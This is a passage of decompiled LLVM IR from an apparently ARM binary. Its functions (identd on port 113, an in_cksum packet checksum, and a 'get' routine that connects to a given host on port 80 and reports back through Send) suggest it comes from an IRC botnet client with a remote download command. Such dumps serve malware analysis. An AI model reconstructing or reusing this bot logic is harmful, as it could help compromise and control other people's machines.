  %v3_10000984 = call i32 @fgets(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  %v1_1000098c = add nuw nsw i32 %storemerge615, 1
  %v2_1000099c = icmp slt i32 %storemerge615, %v2_1000093c
  br i1 %v2_1000099c, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_100009a4:                            ; preds = %dec_label_pc_10000974, %dec_label_pc_10000910
  store i32 268437948, i32* @lr, align 4
  %v3_100009b8 = call i32 @__GI_memset(i32 %v2_10000974, i32 0, i32 1024)
  store i32 268437968, i32* @lr, align 4
  %v3_100009cc = call i32 @fgets(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = call i32 @filter(i32 %v2_10000974)
  store i32 %v0_10000838, i32* @r3, align 4
  store i32 %v2_10000974, i32* @r4, align 4
  store i32 %v1_10000824, i32* @r5, align 4
  store i32 268438008, i32* @lr, align 4
  %v0_100009f4 = call i32 @memcpy()
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = inttoptr i32 %v3_10000874 to i16*
  %v2_100009fc = call i32 @__GI_fclose(i16* %v1_100009fc)
  br label %dec_label_pc_10000a00

dec_label_pc_10000a00:                            ; preds = %dec_label_pc_10000898, %dec_label_pc_100008fc.preheader, %dec_label_pc_100009a4
  ret i32 %v0_10000838

; uselistorder directives
  uselistorder i32 %v1_100008f4, { 1, 0 }
  uselistorder i32 %v0_10000838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000a00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000974, { 1, 0 }
  uselistorder label %dec_label_pc_10000898, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  store i32 268438088, i32* @lr, align 4
  %v3_10000a44 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000a58 = icmp eq i32 %v3_10000a44, -1
  br i1 %v4_10000a58, label %dec_label_pc_10000d80, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %entry
  store i32 113, i32* @r3, align 4
  %v1_10000a6c = call i32 @htons(i32 113)
  store i32 %v3_10000a44, i32* @r3, align 4
  store i32 268438188, i32* @lr, align 4
  %v0_10000aa8 = call i32 @bind()
  %v4_10000ab4 = icmp eq i32 %v0_10000aa8, -1
  br i1 %v4_10000ab4, label %dec_label_pc_10000d80, label %dec_label_pc_10000abc

dec_label_pc_10000abc:                            ; preds = %dec_label_pc_10000a60
  store i32 268438216, i32* @lr, align 4
  %v3_10000ac4 = call i32 @listen(i32 %v3_10000a44, i32 1, i32 %v0_10000aa8)
  %v4_10000ad0 = icmp eq i32 %v3_10000ac4, -1
  br i1 %v4_10000ad0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000abc
  store i32 268438236, i32* @lr, align 4
  %v0_10000ad8 = call i32 @fork()
  %v3_10000ae0 = icmp eq i32 %v0_10000ad8, 0
  br i1 %v3_10000ae0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ae8

dec_label_pc_10000ae8:                            ; preds = %dec_label_pc_10000ad8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000af0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000af4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438280, i32* @lr, align 4
  %v4_10000b04 = call i32 @accept(i32 %v3_10000a44, i32 %v2_10000af0, i32 %v2_10000af4, i32 %v2_10000af4)
  %v4_10000b18 = icmp eq i32 %v4_10000b04, -1
  br i1 %v4_10000b18, label %dec_label_pc_10000b20, label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000ae8
  %v0_10000b24 = call i32 @__GI_exit()
  br label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b28.preheader:                  ; preds = %dec_label_pc_10000b20, %dec_label_pc_10000ae8
  %v2_10000b28 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b70 = udiv i32 %v4_10000b04, 32
  %v1_10000b78 = mul nuw nsw i32 %v1_10000b70, 4
  %v2_10000b7c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b80 = add i32 %v2_10000b7c, 1092
  %v1_10000b84 = add i32 %v2_10000b80, %v1_10000b78
  %v1_10000b88 = inttoptr i32 %v1_10000b84 to i32*
  %v1_10000b90 = urem i32 %v4_10000b04, 32
  %v3_10000b98 = shl i32 1, %v1_10000b90
  %v1_10000bc8 = add i32 %v4_10000b04, 1
  %v2_10000bd0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c24 = sub i32 0, %v4_10000b04
  %v4_10000c24 = urem i32 %v3_10000c24, 32
  %v6_10000c24 = xor i32 %v4_10000c24, 31
  %v12_10000c24 = lshr i32 -1, %v1_10000b90
  %v16_10000c24 = xor i32 %v12_10000c24, 1
  %v14_10000c24 = urem i32 %v12_10000c24, 2
  br label %dec_label_pc_10000b28

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b28.preheader, %dec_label_pc_10000c00
  store i32 %v2_10000b28, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, %dec_label_pc_10000b28
  %v3_10000b40.pre = phi i32 [ %v2_10000b28, %dec_label_pc_10000b28 ], [ %v3_10000b40.pre.pre, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b5830 = phi i32 [ 1, %dec_label_pc_10000b28 ], [ %v1_10000b58, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b44 = mul nuw nsw i32 %v1_10000b5830, 4
  %v2_10000b48 = add i32 %v1_10000b44, %v3_10000b40.pre
  %v2_10000b50 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v2_10000b50, align 4
  %v1_10000b58 = add nuw nsw i32 %v1_10000b5830, 1
  %tmp25 = icmp ult i32 %v1_10000b58, 32
  br i1 %tmp25, label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, label %dec_label_pc_10000b6c

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v3_10000b40.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b6c:                            ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v2_10000b88 = load i32, i32* %v1_10000b88, align 4
  %v2_10000b9c = or i32 %v2_10000b88, %v3_10000b98
  store i32 %v2_10000b9c, i32* %v1_10000b88, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438508, i32* @lr, align 4
  %v6_10000be8 = call i32 @__libc_select(i32 %v1_10000bc8, i32 %v2_10000b28, i32 0, i32 0, i32 %v2_10000bd0, i32 %v2_10000b28)
  %tmp26 = icmp sgt i32 %v6_10000be8, -1
  br i1 %tmp26, label %dec_label_pc_10000c00, label %dec_label_pc_10000bf8

dec_label_pc_10000bf8:                            ; preds = %dec_label_pc_10000b6c
  %v0_10000bfc = call i32 @__GI_exit()
  br label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000b6c, %dec_label_pc_10000bf8
  %v2_10000c18 = load i32, i32* %v1_10000b88, align 4
  %v5_10000c24 = shl i32 %v2_10000c18, %v4_10000c24
  %v7_10000c24 = lshr i32 %v2_10000c18, %v6_10000c24
  %v8_10000c24 = udiv i32 %v7_10000c24, 2
  %v9_10000c24 = or i32 %v8_10000c24, %v5_10000c24
  %tmp = icmp slt i32 %v2_10000c18, 0
  %v15_10000c242 = zext i1 %tmp to i32
  %v17_10000c24 = and i32 %v15_10000c242, %v16_10000c24
  %v14_10000c24.masked = and i32 %v14_10000c24, %v9_10000c24
  %v1_10000c2c = or i32 %v14_10000c24.masked, %v17_10000c24
  %v3_10000c30 = icmp eq i32 %v1_10000c2c, 0
  br i1 %v3_10000c30, label %dec_label_pc_10000b28, label %dec_label_pc_10000c3c

dec_label_pc_10000c3c:                            ; preds = %dec_label_pc_10000c00
  %v2_10000c3c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438612, i32* @lr, align 4
  %v4_10000c50 = call i32 @recv(i32 %v4_10000b04, i32 %v2_10000c3c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c50, 1
  br i1 %tmp27, label %dec_label_pc_10000c74, label %dec_label_pc_10000c68

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c3c
  %tmp28 = icmp slt i32 %v4_10000c50, 20
  br i1 %tmp28, label %dec_label_pc_10000c7c, label %dec_label_pc_10000c74

dec_label_pc_10000c74:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c3c
  %v0_10000c78 = call i32 @__GI_exit()
  br label %dec_label_pc_10000c7c

dec_label_pc_10000c7c:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c74
  %v2_10000c84 = add i32 %v2_10000b7c, 60
  %v3_10000c8c = add i32 %v2_10000c84, %v4_10000c50
  %v4_10000c8c = inttoptr i32 %v3_10000c8c to i8*
  store i8 0, i8* %v4_10000c8c, align 1
  %v1_10000c94 = add i32 %v2_10000b7c, -1
  %v2_10000c9c = add i32 %v1_10000c94, %v4_10000c50
  %v1_10000ca0 = add i32 %v2_10000c9c, 60
  %v2_10000ca0 = inttoptr i32 %v1_10000ca0 to i8*
  %v3_10000ca0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000ca8 = icmp eq i8 %v3_10000ca0, 10
  br i1 %v3_10000ca8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c7c
  %v3_10000cc0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000cc8 = icmp eq i8 %v3_10000cc0, 13
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000ce8

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000c7c
  store i8 0, i8* %v2_10000ca0, align 1
  br label %dec_label_pc_10000ce8

dec_label_pc_10000ce8:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000cd0
  %v1_10000cec = add i32 %v2_10000b7c, -2
  %v2_10000cf4 = add i32 %v1_10000cec, %v4_10000c50
  %v1_10000cf8 = add i32 %v2_10000cf4, 60
  %v2_10000cf8 = inttoptr i32 %v1_10000cf8 to i8*
  %v3_10000cf8 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d00 = icmp eq i8 %v3_10000cf8, 10
  br i1 %v3_10000d00, label %dec_label_pc_10000d28, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %dec_label_pc_10000ce8
  %v3_10000d18 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d20 = icmp eq i8 %v3_10000d18, 13
  br i1 %v3_10000d20, label %dec_label_pc_10000d28, label %dec_label_pc_10000d40

dec_label_pc_10000d28:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000ce8
  store i8 0, i8* %v2_10000cf8, align 1
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d28
  %v3_10000d44 = load i32, i32* @global_var_1002efd0.31, align 4
  %v6_10000d64 = call i32 @Send(i32 %v4_10000b04, i32 ptrtoint ([25 x i8]* @global_var_10017acc.32 to i32), i32 %v2_10000c3c, i32 %v3_10000d44)
  store i32 268438896, i32* @lr, align 4
  %v1_10000d6c = call i32 @close(i32 %v4_10000b04)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d78.33 to i32), i32* @lr, align 4
  %v1_10000d74 = call i32 @close(i32 %v3_10000a44)
  %v0_10000d7c = call i32 @__GI_exit()
  br label %dec_label_pc_10000d80

dec_label_pc_10000d80:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000abc, %dec_label_pc_10000a60, %entry, %dec_label_pc_10000d40
  %v0_10000d94 = phi i32 [ 0, %dec_label_pc_10000ad8 ], [ -1, %dec_label_pc_10000abc ], [ -1, %dec_label_pc_10000a60 ], [ -1, %entry ], [ %v0_10000d7c, %dec_label_pc_10000d40 ]
  ret i32 %v0_10000d94

; uselistorder directives
  uselistorder i8* %v2_10000cf8, { 1, 0, 2 }
  uselistorder i8* %v2_10000ca0, { 1, 0, 2 }
  uselistorder i32 %v4_10000c50, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c18, { 0, 2, 1 }
  uselistorder i32 %v1_10000b58, { 1, 0 }
  uselistorder i32 %v1_10000b90, { 1, 0 }
  uselistorder i32* %v1_10000b88, { 1, 0, 2 }
  uselistorder i32 %v2_10000b28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000b04, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d80, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000b28, { 1, 0 }
}

define i32 @pow(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10000db8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000db8, label %dec_label_pc_10000dc0, label %dec_label_pc_10000dcc

dec_label_pc_10000dc0:                            ; preds = %entry
  br label %dec_label_pc_10000e08

dec_label_pc_10000dcc:                            ; preds = %entry
  %v3_10000dd0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dd0, label %dec_label_pc_10000dd8, label %dec_label_pc_10000de4

dec_label_pc_10000dd8:                            ; preds = %dec_label_pc_10000dcc
  br label %dec_label_pc_10000e08

dec_label_pc_10000de4:                            ; preds = %dec_label_pc_10000dcc
  %v1_10000de8 = add i32 %arg2, -1
  %v2_10000df4 = call i32 @pow(i32 %arg1, i32 %v1_10000de8)
  %v2_10000e00 = mul i32 %v2_10000df4, %arg1
  br label %dec_label_pc_10000e08

dec_label_pc_10000e08:                            ; preds = %dec_label_pc_10000dd8, %dec_label_pc_10000dc0, %dec_label_pc_10000de4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000dc0 ], [ %arg1, %dec_label_pc_10000dd8 ], [ %v2_10000e00, %dec_label_pc_10000de4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000e08, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10000e946 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e946, label %dec_label_pc_10000e60, label %dec_label_pc_10000e9c

dec_label_pc_10000e60:                            ; preds = %entry, %dec_label_pc_10000e60
  %stack_var_-24.010 = phi i32 [ %v1_10000e88, %dec_label_pc_10000e60 ], [ %arg2, %entry ]
  %stack_var_-28.09 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e60 ], [ %arg1, %entry ]
  %stack_var_-32.08 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e60 ], [ 0, %entry ]
  %v4_10000e60 = ptrtoint i16* %stack_var_-28.09 to i32
  %v2_10000e64 = load i16, i16* %stack_var_-28.09, align 2
  %v3_10000e64 = zext i16 %v2_10000e64 to i32
  %v2_10000e70 = add i32 %v3_10000e64, %stack_var_-32.08
  %v1_10000e7c = add i32 %v4_10000e60, 2
  %v5_10000e80 = inttoptr i32 %v1_10000e7c to i16*
  %v1_10000e88 = add nsw i32 %stack_var_-24.010, -2
  %v2_10000e94 = icmp sgt i32 %v1_10000e88, 1
  br i1 %v2_10000e94, label %dec_label_pc_10000e60, label %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge

dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge: ; preds = %dec_label_pc_10000e60
  %v3_10000e94.le = icmp eq i32 %v1_10000e88, 1
  br i1 %v3_10000e94.le, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000e9c:                            ; preds = %entry
  %v3_10000e947 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e947, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000ea8:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c
  %stack_var_-28.0.lcssa18 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ %arg1, %dec_label_pc_10000e9c ]
  %stack_var_-32.0.lcssa17 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ 0, %dec_label_pc_10000e9c ]
  %v1_10000eb0 = bitcast i16* %stack_var_-28.0.lcssa18 to i8*
  %v2_10000eb0 = load i8, i8* %v1_10000eb0, align 1
  %v3_10000eb0 = zext i8 %v2_10000eb0 to i32
  %v2_10000ec8 = add i32 %v3_10000eb0, %stack_var_-32.0.lcssa17
  br label %dec_label_pc_10000ed0

dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c, %dec_label_pc_10000ea8
  %stack_var_-32.1 = phi i32 [ %v2_10000ec8, %dec_label_pc_10000ea8 ], [ 0, %dec_label_pc_10000e9c ], [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ]
  %v4_10000ed4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000edc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ee0 = add nsw i32 %v4_10000ed4, %v1_10000edc
  %v4_10000eec = sdiv i32 %v2_10000ee0, 65536
  %v2_10000ef4 = add nsw i32 %v4_10000eec, %v2_10000ee0
  %v2_10000f0019 = urem i32 %v2_10000ef4, 65536
  %v1_10000f0c = xor i32 %v2_10000f0019, 65535
  ret i32 %v1_10000f0c

; uselistorder directives
  uselistorder i32 %v2_10000ee0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e88, { 0, 2, 1 }
  uselistorder i32 %v2_10000e70, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10000e60, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5172 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f30 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f30, i32* %stack_var_-5232, align 4
  %v1_10000f5c = call i32 @mfork(i32 %arg2)
  %v3_10000f64 = icmp eq i32 %v1_10000f5c, 0
  br i1 %v3_10000f64, label %dec_label_pc_10000f6c, label %dec_label_pc_10001504

dec_label_pc_10000f6c:                            ; preds = %entry
  %v2_10000f70 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f70, label %dec_label_pc_10000f98, label %dec_label_pc_10000f78

dec_label_pc_10000f78:                            ; preds = %dec_label_pc_10000f6c
  %v6_10000f8c = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_10017ae8.34 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v0_10000f94 = call i32 @__GI_exit()
  br label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f6c, %dec_label_pc_10000f78
  store i32 268439464, i32* @lr, align 4
  %v3_10000fa4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000fb8 = icmp eq i32 %v3_10000fa4, -1
  br i1 %v4_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000fe0

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f98
  %v6_10000fd4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_10017b0c.37 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v0_10000fdc = call i32 @__GI_exit()
  br label %dec_label_pc_10000fe0

dec_label_pc_10000fe0:                            ; preds = %dec_label_pc_10000f98, %dec_label_pc_10000fc0
  %v1_10000fe4 = add i32 %arg4, 4
  %v1_10000fe8 = inttoptr i32 %v1_10000fe4 to i32*
  %v2_10000fe8 = load i32, i32* %v1_10000fe8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10017b34.39 to i32), i32* @r4, align 4
  %v6_10000ffc = inttoptr i32 %v2_10000fe8 to i8*
  %v7_10000ffc = call i32 @__GI_strncmp(i8* %v6_10000ffc, i32 ptrtoint ([8 x i8]* @global_var_10017b34.39 to i32), i32 7, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v3_10001004 = icmp eq i32 %v7_10000ffc, 0
  %v2_10001014 = load i32, i32* %v1_10000fe8, align 4
  br i1 %v3_10001004, label %dec_label_pc_1000100c, label %dec_label_pc_10001030

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fe0
  %v1_10001018 = add i32 %v2_10001014, 7
  %v2_1000101c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001028 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001028 = call i32 @strcpy(i32 %v2_1000101c, i8* %v2_10001028)
  br label %dec_label_pc_1000104c

dec_label_pc_10001030:                            ; preds = %dec_label_pc_10000fe0
  %v2_1000103c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001048 = inttoptr i32 %v2_10001014 to i8*
  %v3_10001048 = call i32 @strcpy(i32 %v2_1000103c, i8* %v2_10001048)
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_1000100c, %dec_label_pc_10001030
  %v2_10001068.pre-phi = phi i32 [ %v2_1000101c, %dec_label_pc_1000100c ], [ %v2_1000103c, %dec_label_pc_10001030 ]
  %v2_10001084 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_1000107065 = call i32 @__GI_strlen()
  %v2_1000107867 = icmp eq i32 %v0_1000107065, 0
  br i1 %v2_1000107867, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, label %dec_label_pc_10001080

dec_label_pc_10001058:                            ; preds = %dec_label_pc_10001080
  %v1_1000105c = add i32 %storemerge570, 1
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_10001070 = call i32 @__GI_strlen()
  %v2_10001078 = icmp ult i32 %v1_1000105c, %v0_10001070
  br i1 %v2_10001078, label %dec_label_pc_10001080, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge

dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge: ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000104c ], [ %v1_1000105c, %dec_label_pc_10001058 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001084
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000109c

dec_label_pc_10001080:                            ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge570 = phi i32 [ %v1_1000105c, %dec_label_pc_10001058 ], [ 0, %dec_label_pc_1000104c ]
  %v2_10001088 = add i32 %storemerge570, %v2_10001084
  %v1_1000108c = add i32 %v2_10001088, 60
  %v2_1000108c = inttoptr i32 %v1_1000108c to i8*
  %v3_1000108c = load i8, i8* %v2_1000108c, align 1
  %v3_10001094 = icmp eq i8 %v3_1000108c, 47
  br i1 %v3_10001094, label %dec_label_pc_1000109c, label %dec_label_pc_10001058

dec_label_pc_1000109c:                            ; preds = %dec_label_pc_10001080, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %storemerge570, %dec_label_pc_10001080 ]
  %v4_100010ac.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %v2_1000108c, %dec_label_pc_10001080 ]
  store i8 0, i8* %v4_100010ac.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010bc = call i32 @htons(i32 80)
  store i32 268439764, i32* @lr, align 4
  %v1_100010d0 = call i32 @inet_addr(i32 %v2_10001068.pre-phi)
  %v4_100010e4 = icmp eq i32 %v1_100010d0, -1
  br i1 %v4_100010e4, label %dec_label_pc_100010ec, label %dec_label_pc_10001160

dec_label_pc_100010ec:                            ; preds = %dec_label_pc_1000109c
  store i32 268439800, i32* @lr, align 4
  %v2_100010f4 = call i32 @__GI_gethostbyname(i32 %v2_10001068.pre-phi, i32 -1)
  %v3_10001104 = icmp eq i32 %v2_100010f4, 0
  br i1 %v3_10001104, label %dec_label_pc_1000110c, label %dec_label_pc_1000112c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010ec
  %v6_10001120 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_10017b3c.42 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v0_10001128 = call i32 @__GI_exit()
  br label %dec_label_pc_1000112c

dec_label_pc_1000112c:                            ; preds = %dec_label_pc_100010ec, %dec_label_pc_1000110c
  %v2_10001130 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001138 = add i32 %v2_100010f4, 16
  %v2_10001138 = inttoptr i32 %v1_10001138 to i32*
  %v3_10001138 = load i32, i32* %v2_10001138, align 4
  %v1_1000113c = inttoptr i32 %v3_10001138 to i32*
  %v2_1000113c = load i32, i32* %v1_1000113c, align 4
  store i32 %v2_1000113c, i32* %r11.global-to-local, align 4
  %v1_10001144 = add i32 %v2_100010f4, 12
  %v2_10001144 = inttoptr i32 %v1_10001144 to i32*
  %v3_10001144 = load i32, i32* %v2_10001144, align 4
  store i32 %v2_10001130, i32* @r3, align 4
  store i32 %v2_1000113c, i32* @r4, align 4
  store i32 %v3_10001144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000115c.45 to i32), i32* @lr, align 4
  %v0_10001158 = call i32 @memcpy()
  br label %dec_label_pc_10001168

dec_label_pc_10001160:                            ; preds = %dec_label_pc_1000109c
  store i32 %v1_100010d0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001168

dec_label_pc_10001168:                            ; preds = %dec_label_pc_1000112c, %dec_label_pc_10001160
  %v2_10001168.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  %v2_1000116c = ptrtoint i32* %stack_var_-5172 to i32
  store i32 0, i32* %stack_var_-5172, align 4
  store i32 268439956, i32* @lr, align 4
  %v4_10001190 = call i32 @connect(i32 %v3_10000fa4, i32 %v2_10001168.pre-phi, i32 16, i32 %v2_1000116c)
  %v3_10001198 = icmp eq i32 %v4_10001190, 0
  br i1 %v3_10001198, label %dec_label_pc_100011c0, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001168
  %v6_100011b4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_10017b64.46 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v0_100011bc = call i32 @__GI_exit()
  br label %dec_label_pc_100011c0

dec_label_pc_100011c0:                            ; preds = %dec_label_pc_10001168, %dec_label_pc_100011a0
  %v2_100011c8 = add i32 %v2_10001068.pre-phi, 1
  %v1_100011cc = add i32 %v2_100011c8, %storemerge564
  store i32 %v2_10001068.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011ec = call i32 @Send(i32 %v3_10000fa4, i32 ptrtoint ([276 x i8]* @global_var_10017b8c.48 to i32), i32 %v1_100011cc, i32 %v2_10001068.pre-phi)
  %v6_10001204 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_10017ca0.49 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v1_1000120c = add i32 %arg4, 8
